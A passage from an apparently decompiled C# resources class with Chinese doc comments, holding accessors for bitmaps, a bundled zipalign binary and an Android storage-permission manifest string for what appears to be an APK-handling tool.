	internal static Bitmap warning48px
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("warning48px", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap wifi
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("wifi", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找类似 &lt;uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/&gt; 的本地化字符串。
	/// </summary>
	internal static string WritePrim => ResourceManager.GetString("WritePrim", resourceCulture);

	/// <summary>
	///   查找 System.Drawing.Bitmap 类型的本地化资源。
	/// </summary>
	internal static Bitmap X_sign
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("X_sign", resourceCulture));
			return (Bitmap)objectValue;
		}
	}

	/// <summary>
	///   查找 System.Byte[] 类型的本地化资源。
	/// </summary>
	internal static byte[] zipalign
	{
		get
		{
			object objectValue = RuntimeHelpers.GetObjectValue(ResourceManager.GetObject("zipalign", resourceCulture));
			return (byte[])objectValue;
		}
	}
}
